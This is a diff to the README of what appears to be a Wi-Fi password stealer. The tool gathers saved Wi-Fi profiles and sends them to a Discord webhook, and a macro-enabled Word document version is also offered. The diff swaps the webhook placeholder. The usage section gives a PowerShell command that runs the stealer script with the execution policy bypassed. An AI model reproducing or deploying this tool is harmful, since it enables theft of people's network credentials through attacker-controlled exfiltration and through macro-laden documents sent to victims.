@@ -20,7 +20,7 @@ This script is a wifi password Grabber that fetched the wifi-profiles of every w
 - `Wifi.docm` - The macros version.
 
 # Usage
-Replace `https://discord.com/api/webhooks/<channel_id>/<webhook_id>` with your own [webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
+Replace `"ENTER YOUR DISCORD WEBHOOK URL">` with your own [webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
 ### Powershell
 ```powershell
 powershell -ExecutionPolicy Bypass -File Wifi-Stealer-Discord.ps1
